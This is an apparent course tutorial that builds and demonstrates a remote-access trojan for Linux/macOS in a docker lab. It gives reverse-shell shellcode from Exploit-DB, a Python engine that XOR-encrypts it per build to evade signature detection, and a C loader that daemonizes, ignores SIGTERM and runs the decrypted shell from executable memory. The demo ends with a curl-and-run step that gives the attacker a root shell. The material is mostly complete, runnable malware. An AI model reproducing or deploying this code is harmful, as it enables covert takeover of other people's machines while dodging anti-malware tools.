We create an RAT malware with a **polymorphic engine** which enables
dodging signature-based detection from anti-malware tools.
This is made possible using encryption techniques and the
ability to execute dynamically generated machine code.
This attack is specifically for linux/macOS but can be
extended to work on Windows as well.
We also demo the attack in action.

## Setup

***

We set up a network to simulate a connection between a user who unwittingly installs the malware
(Alice) and the malicious user (Mallory).

```yaml
version: '3'

services:
    
  alice:
      image: # private image
      container_name: alice
      tty: true
      networks:
        internal:
          ipv4_address: 10.0.0.2
      cap_add:
        - NET_ADMIN
        - SYS_ADMIN
        
  mallory:
      image: # private image
      container_name: mallory
      tty: true
      restart: always
      cap_add:
        - NET_ADMIN
      volumes:
          - .:/shared
      networks:
        internal:
          ipv4_address: 10.0.0.3

networks:
  internal:
    driver: bridge
    ipam:
      config:
        - subnet: 10.0.0.0/24
```

we may then start Mallory's and Alice's containers

```
$ docker-compose up -d
```

and interactive sessions with

```
$ docker exec -it mallory bash
$ docker exec -it alice bash
```

we will want two sessions as Mallory, and one with Alice.

## Executing Machine Code From Protected Memory

***

We will use a technique from a [great blog post](http://blog.jeff.over.bz/assembly/compilers/jit/2017/03/30/executing-dynamically-generated-machine-code.html)
which goes over how to execute shellcode directly from memory which would normally be protected.

Suppose we would like to execute the assembly:

```asm
mov eax, 12345678h
ret
```

in our target [machine language](https://en.wikipedia.org/wiki/Machine_code),
this can be written as the following 6-bytes

```
b8 78 56 34 12 c3
```

<br>

***

### A First Attempt

***

For our first attempt, we may simply try to set a function pointer to the beginning
of an array containing the machine code like

```c
#include <stdint.h>
#include <stdio.h>

uint8_t machine_code[] = { 0xB8, 0x78, 0x56, 0x34, 0x12, 0xC3 };

int main(int argc, char **argv) {
    uint32_t (*fn)() = (uint32_t (*)()) &machine_code;
    uint32_t result = fn();
    printf("result = %u\n", result);
    return 0;
}
```

Attempting to run this, we will promptly be greeted with

```
Segmentation fault (core dumped)
```

so what went wrong here? If we recall some of our [earlier exercises](),
we remember that we explicitly had to make the desired section of our stack executable.
This is due to OS protection which, by default, prevents execution of machine code
in regions where it is not expected (for example, our array in the program above).
This may be implemented in various ways one being the [NX bit](https://en.wikipedia.org/wiki/NX_bit).

<br>

***

### A More Sophisticated Approach

***

Our goal then becomes to mark a region of memory as executable and copy the
target machine code to that same space. We start with the required header files and
by allocating a new page of memory:

```c
#include <stddef.h>    // size_t
#include <stdint.h>    // uint8_t, uint32_t
#include <stdio.h>     // printf
#include <string.h>    // memcpy
#include <sys/mman.h>  // mmap, mprotect, munmap, MAP_FAILURE

int main(int argc, char **argv) {
    void *mem = mmap(NULL, sizeof(PAYLOAD), PROT_READ | PROT_WRITE,
        MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }
```

`PAYLOAD` will be our encrypted payload, but we're getting ahead of ourselves.

The prototype for `mmap()` is

```
void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
```

Details can be found [here](https://man7.org/linux/man-pages/man2/mmap.2.html)
but in in summary for this call:
- setting `addr` to `NULL` has the system choos the address for us
- `PROT_READ | WRITE` allows the page to be read and written to
- `MAP_ANONYMOUS | PRIVATE` specifies to zeroize the memory

next, we copy our machine code to the allocated space

```c
    memcpy(mem, PAYLOAD, sizeof(PAYLOAD));
```

and change the page protections to read+execute

```c
    if (mprotect(mem, sizeof(plain), PROT_READ | PROT_EXEC) == -1) {
        perror("mprotect");
        return 2;
    }
```

with this we can now execute the shellcode directly from memory
by setting a function pointer to the newly allocated space and
calling it. We can also free the memory after this is done.

```c
    int (*ret)() = (int(*)())mem;
    ret();

    // Free the memory
    if (munmap(mem, sizeof(plain)) == -1) {
        perror("munmap");
        return 3;
    }
}
```

<br>

***

## Making it Malicious

***

The experiment we went through becomes quite useful when the payload is shellcode.
For this example, we open a reverse tcp bind shell using shellcode written by
Russell Willis ([Exploit DB entry](https://www.exploit-db.com/exploits/43599)):

```c
unsigned char PAYLOAD[] = \
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
"\x02" PORT "\xc7\x44\x24\x04" IPADDR "\x48\x89\xe6\x6a\x10"
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
"\x5f\x6a\x3b\x58\x0f\x05"
```

however instead of having this in plain sight for signature detection algorithms,
we will obfuscate it with encryption using a very simple polymorphic engine written in python.

<br>

***

## Writing the Polymorphic Engine

***

Our polymorphic engine will only be used to generate a different-looking malware
for each instance. This is done using
[one-time pad](https://en.wikipedia.org/wiki/One-time_pad)
with a simple xor cipher.

The python file here simply creates a header file called `zmalware.h`
which contains the enciphered shellcode and corresponding one-time pad key.

```python
#!/bin/python

import os
import random, string

IPADDR=b"\x0a\x00\x00\x03" # 10.0.0.3
PORT=b"\x01\xbb"           # 443

# raw shellcode
RAW = b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" +\
b"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" +\
b"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24" +\
b"\x02" + PORT + b"\xc7\x44\x24\x04" + IPADDR + b"\x48\x89\xe6\x6a\x10" +\
b"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48" +\
b"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" +\
b"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" +\
b"\x5f\x6a\x3b\x58\x0f\x05"

# generate a random key
KEY = os.urandom(len(RAW))

# create a string of the key to write to the header file
KEYstr = ''.join((r'\x' if b > 15 else r'\x0')+hex(b)[2:] for b in KEY)
print("KEY:")
print(KEYstr)
ciphertext = b""
for b1, b2 in zip(RAW,KEY):
    ciphertext += bytes([b1 ^ b2])

# create a string of the enciphered payload to write to the header file
cipherstr = ''.join((r'\x' if b > 15 else r'\x0')+hex(b)[2:] for b in ciphertext)
print("ciphertext:")
print(cipherstr)

include_statements = \
'\
#include <unistd.h>\n\
#include <stdio.h>\n\
#include <signal.h>\n\
#include <stddef.h>    // size_t\n\
#include <stdint.h>    // uint8_t, uint32_t\n\
#include <string.h>    // memcpy\n\
#include <sys/mman.h>  // mmap, mprotect, munmap, MAP_FAILURE\n\n\
'

with open('malware.h', 'a') as header:
    header.write(include_statements)
    header.write('unsigned char KEY[] = ')
    header.write('"' + KEYstr + '";')
    header.write("\n")
    header.write('unsigned char CYP[] = ')
    header.write('"' + cipherstr + '";')

```

Say we call this `engine.py`.
This changes for each call so for each different key (as well as IP and PORT) we
have a malware which "looks" different when compiled.

(Note that this is simple for demonstration purposes, most polymorphic code is
also self-replicating and uses more sophisticated methods of obfuscation/encryption).

***

## Running the Obfuscated Shellcode

***

Since the shellcode is encrypted, we cannot simply run it, however, having the key
it is trivial to decipher the shellcode to later execute.

The completed file is as follows:

```c
#include "malware.h"

int main(void)
{
    // daemonize and run the process in the background
    if (daemon(0, 0) == -1) return 5;
    signal(SIGTERM, SIG_IGN);

    // allocate the memory
    void *mem = mmap(NULL, sizeof(CYP), PROT_READ | PROT_WRITE,
        MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    /* decrypt using simple xor cipher with key KEY */
    unsigned char plain[sizeof(CYP)];
    for (int i = 0; i < sizeof(CYP); i++)
    {
        // This allows flexibility for different key sizes
        plain[i] = CYP[i]^KEY[i % sizeof(KEY)];
    }
    
    // Write the now decrypted machine code into the newly allocated page
    memcpy(mem, plain, sizeof(plain));

    // Change the page protections to read + execute
    if (mprotect(mem, sizeof(plain), PROT_READ | PROT_EXEC) == -1) {
        perror("mprotect");
        return 2;
    }

    // execute the function directly from memory
    printf("Shellcode Length: %d\n", (int)sizeof(plain)-1);
    int (*ret)() = (int(*)())mem;
    ret();

    // Free the memory
    if (munmap(mem, sizeof(plain)) == -1) {
        perror("munmap");
        return 3;
    }

    return 0;
}
```

notice that we also made our process run in the background
by daemonizing and ignore `SIGTERM` to make it more persistent.

## Demo

***

A demo using the docker containers we have open can be done as follows:

1. Mallory generates a new form of the malware using `# python3 engine.py`
2. Mallory compiles with `# gcc -o fileless fileless.c zmalware.h` creating the `fileless` executable.
3. Mallory listens for connection, say with [netcat](https://en.wikipedia.org/wiki/Netcat):
```
# nc -lvp 443
listening on [any] 443 ...
```
  - `l` tells netcat to be in "listen" mode
  - `v` is for "verbose" mode and
  - `p` is to specify the port we are listening on
4. Mallory hosts the malware
```
/shared# python3 -m http.server 80 --bind 10.0.0.3
```
5. Alice downloads and runs the malware
```
/home/tmp# curl http://10.0.0.3/fileless -o fileless
/home/tmp# chmod +x fileless
/home/tmp# ./fileless
```

As soon as Alice runs the binary, we notice that the terminal where Mallory was listening using netcat connects to Alice's host

```
connect to [10.0.0.3] from alice.polymal_internal [10.0.0.2] 44640
```

and Mallory can run commands. Since Alice ran the program with root privileges we have

```
whoami
root
```

Mallory now has root access to Alice's machine.
